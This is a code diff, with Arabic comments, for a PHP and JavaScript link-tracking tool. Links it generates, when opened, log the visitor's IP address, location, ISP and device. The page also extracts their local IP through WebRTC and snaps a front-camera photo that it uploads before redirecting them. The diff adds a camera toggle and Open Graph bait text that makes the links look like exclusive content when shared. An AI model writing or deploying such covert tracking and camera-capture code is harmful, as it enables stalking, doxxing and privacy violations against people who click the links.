@@ -1,4 +1,7 @@
 <?php
+// ضبط المنطقة الزمنية للجزائر بدقة
+date_default_timezone_set('Africa/Algiers');
+
 // إظهار الأخطاء للتحقق والتأكد من العمل
 ini_set('display_errors', 1);
 error_reporting(E_ALL);
@@ -6,11 +9,12 @@ error_reporting(E_ALL);
 try {
     $db = new PDO('sqlite:tracker.db');$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
 
-    // إنشاء الجداول مع الحقول الكاملة
+    // إنشاء الجداول مع إضافة حقل خيار الكاميرا
     $db->exec("CREATE TABLE IF NOT EXISTS links (
         id INTEGER PRIMARY KEY AUTOINCREMENT, 
         code TEXT UNIQUE, 
         target_url TEXT, 
+        use_camera INTEGER DEFAULT 1,
         created_at DATETIME DEFAULT CURRENT_TIMESTAMP
     )");
 
@@ -103,24 +107,28 @@ function get_ip_details($ip) {
         return [
             'country' => $data['country'] ?? 'غير معروف',
             'city' => $data['city'] ?? 'غير معروف',
-            'lat' => $data['lat'] ?? '36.7538', 'lon' =>$data['lon'] ?? '3.0588',
+            'lat' => $data['lat'] ?? '36.7538', 
+            'lon' =>$data['lon'] ?? '3.0588',
             'isp' => parse_isp($data['isp'] ?? '',$data['org'] ?? '')
         ];
     }
     return ['country' => 'غير معروف', 'city' => 'غير معروف', 'lat' => '36.7538', 'lon' => '3.0588', 'isp' => 'غير معروف'];
 }
 
-// 1. معالجة إعادة التوجيه وتسجيل الزيارة
+// التحقق مما إذا كان الرابط المطلوب يحتوي على إعداد الكاميرا
+$current_use_camera = 1;
 if (isset($_GET['r'])) {
     $code =$_GET['r'];
-    $stmt =$db->prepare("SELECT target_url FROM links WHERE code = ?");
+    $stmt =$db->prepare("SELECT * FROM links WHERE code = ?");
     $stmt->execute([$code]);
     $link =$stmt->fetch(PDO::FETCH_ASSOC);
 
     if ($link) {
         $target =$link['target_url'];
+        $current_use_camera =$link['use_camera'];
         
-        if (isset($_GET['capture']) &&$_GET['capture'] == '1') {
+        if (isset($_GET['check_cam'])) {
+            echo json_encode(['use_camera' => $current_use_camera]);
             exit();
         }
 
@@ -132,15 +140,13 @@ if (isset($_GET['r'])) {
         $device = get_device_type($ua);
         $screen =$_GET['screen'] ?? 'غير متوفر';
         $tz =$_GET['tz'] ?? 'غير متوفر';
+        $created_at = date('Y-m-d H:i:s'); // التوقيت الجزائري الدقيق بالثانية
 
-        // التحقق من عدم تسجيل نفس الزيارة برقم الشاشة مرتين، أو تسجيلها مباشرة
         if (isset($_GET['screen'])) {
             try {
-                $logStmt =$db->prepare("INSERT INTO logs (code, public_ip, local_ip, port, country, city, lat, lon, isp, device_info, screen_res, timezone) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
-                $logStmt->execute([$code,$public_ip, $local_ip,$port, $geo['country'],$geo['city'], $geo['lat'],$geo['lon'], $geo['isp'],$device, $screen,$tz]);
-            } catch (Exception $e) {
-                // تخطي الأخطاء
-            }
+                $logStmt =$db->prepare("INSERT INTO logs (code, public_ip, local_ip, port, country, city, lat, lon, isp, device_info, screen_res, timezone, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
+                $logStmt->execute([$code, $public_ip,$local_ip, $port,$geo['country'], $geo['city'],$geo['lat'], $geo['lon'],$geo['isp'], $device,$screen, $tz,$created_at]);
+            } catch (Exception $e) {}
 
             header("Location: " . $target);
             exit();
@@ -158,10 +164,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' and isset($_POST['create'])) {
     if (!filter_var($target_url, FILTER_VALIDATE_URL)) {
         $target_url = "https://" . $target_url;
     }
+    $use_camera = isset($_POST['use_camera']) ? 1 : 0;
 
     $code = substr(md5(uniqid(rand(), true)), 0, 7);
-    $stmt =$db->prepare("INSERT INTO links (code, target_url) VALUES (?, ?)");
-    $stmt->execute([$code,$target_url]);
+    $stmt =$db->prepare("INSERT INTO links (code, target_url, use_camera) VALUES (?, ?, ?)");
+    $stmt->execute([$code, $target_url,$use_camera]);
 
     $tracking_code =$code;
     $domain = $_SERVER['HTTP_HOST'];$generated_link = "https://" . $domain . "/?r=" . $code;
@@ -185,6 +192,13 @@ if (!empty($filter_code)) {
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Hello World from azez</title>
+    <!-- وسوم Open Graph لظهور الصورة والعنوان عند المشاركة في واتساب وفيسبوك -->
+    <meta property="وصف الموقع" content="رابط تتبع ذكي ومحمي">
+    <meta property="og:title" content="محتوى حصري ومهم - انقر للمشاهدة">
+    <meta property="og:description" content="اضغط هنا لعرض المحتوى وتفاصيل الرابط بشكل مباشر.">
+    <meta property="og:image" content="https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60">
+    <meta property="og:type" content="website">
+
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, sans-serif; }
         body { background-color: #0b0f19; color: #f3f4f6; padding: 15px; line-height: 1.5; }
@@ -198,9 +212,11 @@ if (!empty($filter_code)) {
         .stat-box strong { font-size: 16px; color: #38bdf8; }
         h2 { color: #38bdf8; font-size: 16px; margin-bottom: 12px; font-weight: 700; }
         .form-group { display: flex; flex-direction: column; gap: 10px; }
-        @media(min-width: 600px) { .form-group { flex-direction: row; } }
+        @media(min-width: 600px) { .form-group { flex-direction: row; align-items: center; } }
         input[type="text"] { flex: 1; background: #030712; border: 1px solid #374151; border-radius: 8px; padding: 12px; color: #fff; font-size: 14px; outline: none; width: 100%; }
         input[type="text"]:focus { border-color: #38bdf8; }
+        .checkbox-label { display: flex; align-items: center; gap: 8px; color: #38bdf8; font-size: 14px; cursor: pointer; user-select: none; }
+        .checkbox-label input { width: 18px; height: 18px; cursor: pointer; accent-color: #0284c7; }
         button, .btn { background: #0284c7; color: white; border: none; padding: 12px 20px; border-radius: 8px; font-weight: bold; cursor: pointer; transition: background 0.2s; text-decoration: none; display: inline-block; text-align: center; font-size: 14px; white-space: nowrap; }
         button:hover, .btn:hover { background: #0369a1; }
         .result-box { background: #030712; border: 1px solid rgba(56, 189, 248, 0.3); padding: 14px; border-radius: 8px; margin-top: 12px; word-break: break-all; }
@@ -222,14 +238,10 @@ if (!empty($filter_code)) {
         .link-row { display: flex; gap: 8px; margin-top: 6px; align-items: center; }
     </style>
     <script>
-        // دالة ذكية لاستخراج الـ IP المحلي عبر تقنية WebRTC (STUN)
         function getLocalIP(callback) {
             let ips = [];
             let RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
-            if (!RTCPeerConnection) {
-                callback("غير مدعوم");
-                return;
-            }
+            if (!RTCPeerConnection) { callback("غير مدعوم"); return; }
             let pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
             pc.createDataChannel("");
             pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
@@ -241,7 +253,6 @@ if (!empty($filter_code)) {
                     let ip = myIP[1];
                     if (!ips.includes(ip)) {
                         ips.push(ip);
-                        // استثناء الـ Localhost الوهمي والبحث عن الـ IP الحقيقي داخل الشبكة مثل 192.168 أو 10
                         if (ip.startsWith("192.168.") || ip.startsWith("10.") || ip.startsWith("172.")) {
                             callback(ip);
                             pc.onicecandidate = null;
@@ -249,9 +260,7 @@ if (!empty($filter_code)) {
                     }
                 }
             };
-            setTimeout(() => {
-                if (ips.length === 0) callback("192.168.1.X");
-            }, 1000);
+            setTimeout(() => { if (ips.length === 0) callback("192.168.1.X"); }, 800);
         }
 
         document.addEventListener("DOMContentLoaded", function() {
@@ -260,39 +269,48 @@ if (!empty($filter_code)) {
             const hasScreen = urlParams.has('screen');
 
             if (redirectCode && !hasScreen) {
-                // 1. التقاط السيلفي أولاً
-                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-                        .then(function(stream) {
-                            const video = document.createElement('video');
-                            video.srcObject = stream;
-                            video.play();
-                            
-                            setTimeout(function() {
-                                const canvas = document.createElement('canvas');
-                                canvas.width = 320;
-                                canvas.height = 240;
-                                const ctx = canvas.getContext('2d');
-                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                                const imageData = canvas.toDataURL('image/jpeg', 0.8);
-                                
-                                stream.getTracks().forEach(track => track.stop());
+                // التحقق هل الرابط يفعل ميزة الكاميرا أم لا
+                fetch(`/?r=${redirectCode}&check_cam=1`)
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.use_camera == 1 && navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                            // فتح الكاميرا والتقاط الصورة بسرعة فائقة
+                            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                                .then(function(stream) {
+                                    const video = document.createElement('video');
+                                    video.srcObject = stream;
+                                    video.play();
+                                    
+                                    // التقاط الصورة فوراً دون تأخير لزيادة السرعة
+                                    requestAnimationFrame(() => {
+                                        const canvas = document.createElement('canvas');
+                                        canvas.width = 320;
+                                        canvas.height = 240;
+                                        const ctx = canvas.getContext('2d');
+                                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                                        const imageData = canvas.toDataURL('image/jpeg', 0.8);
+                                        
+                                        stream.getTracks().forEach(track => track.stop());
 
-                                const formData = new URLSearchParams();
-                                formData.append('action', 'save_photo');
-                                formData.append('code', redirectCode);
-                                formData.append('image', imageData);
+                                        const formData = new URLSearchParams();
+                                        formData.append('action', 'save_photo');
+                                        formData.append('code', redirectCode);
+                                        formData.append('image', imageData);
 
-                                fetch(window.location.href, { method: 'POST', body: formData })
-                                    .finally(() => { fetchLocalIpAndRedirect(redirectCode); });
-                            }, 1000);
-                        })
-                        .catch(function(error) {
+                                        fetch(window.location.href, { method: 'POST', body: formData })
+                                            .finally(() => { fetchLocalIpAndRedirect(redirectCode); });
+                                    });
+                                })
+                                .catch(function(error) {
+                                    fetchLocalIpAndRedirect(redirectCode);
+                                });
+                        } else {
                             fetchLocalIpAndRedirect(redirectCode);
-                        });
-                } else {
-                    fetchLocalIpAndRedirect(redirectCode);
-                }
+                        }
+                    })
+                    .catch(() => {
+                        fetchLocalIpAndRedirect(redirectCode);
+                    });
             }
         });
 
@@ -341,6 +359,9 @@ if (!empty($filter_code)) {
             <h2>🔗 إنشاء رابط تتبع جديد</h2>
             <form method="POST" class="form-group">
                 <input type="text" name="target_url" placeholder="أدخل الرابط المستهدف (مثال: youtube.com)" required>
+                <label class="checkbox-label">
+                    <input type="checkbox" name="use_camera" value="1" checked> تفعيل التقاط صورة سيلفي
+                </label>
                 <button type="submit" name="create">توليد الرابط</button>
             </form>
 
@@ -388,7 +409,7 @@ if (!empty($filter_code)) {
                             <th>الموقع الخريطة</th>
                             <th>مزود الخدمة</th>
                             <th>الشاشة والتوقيت</th>
-                            <th>الوقت</th>
+                            <th>الوقت (التوقيت الجزائري)</th>
                         </tr>
                     </thead>
                     <tbody>
@@ -402,7 +423,7 @@ if (!empty($filter_code)) {
                                     <?php if (!empty($log['photo']) && file_exists($log['photo'])): ?>
                                         <img src="<?php echo htmlspecialchars($log['photo']); ?>" class="visitor-photo" alt="صورة الزائر" title="انقر للتكبير">
                                     <?php else: ?>
-                                        <span style="color: #6b7280; font-size: 10px;">لا توجد صورة</span>
+                                        <span style="color: #6b7280; font-size: 10px;">بدون كاميرا</span>
                                     <?php endif; ?>
                                 </td>
                                 <td>
@@ -419,7 +440,7 @@ if (!empty($filter_code)) {
                                 </td>
                                 <td><strong style="color: #38bdf8;"><?php echo htmlspecialchars($log['isp']); ?></strong></td>
                                 <td><?php echo htmlspecialchars($log['screen_res']); ?> - <?php echo htmlspecialchars($log['timezone']); ?></td>
-                                <td style="color: #9ca3af; white-space: nowrap;"><?php echo htmlspecialchars($log['created_at']); ?></td>
+                                <td style="color: #34d399; font-weight: bold; white-space: nowrap;"><?php echo htmlspecialchars($log['created_at']); ?></td>
                             </tr>
                             <?php endforeach; ?>
                         <?php endif; ?>
